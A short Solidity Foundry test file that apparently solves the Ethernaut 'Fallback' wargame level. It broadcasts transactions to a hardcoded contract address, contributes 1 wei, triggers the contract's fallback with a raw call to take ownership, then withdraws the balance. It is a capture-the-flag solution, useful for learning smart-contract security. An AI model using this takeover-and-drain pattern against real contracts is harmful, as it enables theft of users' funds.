pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contracts/Fallback.sol";

contract TestFallback is Test {
    Fallback public level1;
    function setUp() public {
        level1 = Fallback(payable(0x80963Bdd13506a4FA7aF0Fa81E2acec3430D8529));
    }

    function testSuccess_Attack() external {
        vm.startBroadcast();

        level1.contribute{value: 1 wei}();
        level1.getContribution();
        address(level1).call{value: 1 wei}("");
        level1.owner();
        level1.withdraw();

        vm.stopBroadcast();
    }
}